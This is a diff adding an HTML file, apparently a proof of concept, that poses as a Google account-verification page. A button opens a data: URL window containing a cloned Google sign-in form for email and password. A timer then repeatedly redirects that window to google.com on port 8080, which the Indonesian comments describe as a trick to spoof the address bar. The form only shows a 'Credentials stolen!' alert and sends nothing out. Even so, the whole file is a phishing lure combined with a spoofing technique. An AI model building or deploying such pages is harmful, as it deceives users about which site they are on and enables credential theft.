@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>google.com</title>
+  <style>
+    body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background: #f5f5f5; }
+    button {
+      background: #4285f4; color: white; padding: 14px 32px;
+      font-size: 18px; border: none; border-radius: 8px; cursor: pointer;
+    }
+    button:hover { background: #3367d6; }
+  </style>
+</head>
+<body>
+
+<h1>Google Account Security</h1>
+<p>Click the button below to verify your identity</p>
+<button onclick="spoof()">Verify Now</button>
+
+<script>
+function spoof() {
+  // PAKAI data:text/html — BUKAN about:blank!
+  const dataURL = "data:text/html," + encodeURIComponent(`
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Sign in - Google Accounts</title>
+  <style>
+    body { font-family: 'Google Sans', Arial, sans-serif; background:#fff; margin:0; padding:40px; text-align:center; }
+    .logo { width:100px; margin-bottom:30px; }
+    h1 { font-size:24px; color:#333; margin-bottom:10px; }
+    p { color:#666; margin-bottom:30px; }
+    input {
+      width:100%; max-width:320px; padding:14px; margin:10px 0;
+      border:1px solid #dadce0; border-radius:8px; font-size:16px;
+    }
+    button {
+      background:#1a73e8; color:white; border:none; padding:14px 32px;
+      font-size:16px; border-radius:8px; cursor:pointer; margin-top:20px;
+    }
+    button:hover { background:#1557b0; }
+  </style>
+</head>
+<body>
+  <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo" alt="Google">
+  <h1>Sign in</h1>
+  <p>Use your Google Account</p>
+
+  <form onsubmit="alert('Credentials stolen!'); return false;">
+    <input type="email" placeholder="Email or phone" required autocomplete="username">
+    <input type="password" placeholder="Password" required autocomplete="current-password">
+    <br>
+    <button type="submit">Next</button>
+  </form>
+
+  <p style="margin-top:40px; font-size:13px; color:#999;">
+    Not your computer? Use Guest mode.
+  </p>
+</body>
+</html>
+  `);
+
+  // BUKA DENGAN data:text/html
+  let win = window.open(dataURL, "_blank");
+
+  // SPOOF ADDRESS BAR PAKAI PORT TRICK (tetap jalan!)
+  setInterval(() => {
+    try {
+      win.location.replace("https://google.com:8080");
+    } catch (e) {}
+  }, 10);
+}
+</script>
+
+</body>
+</html>
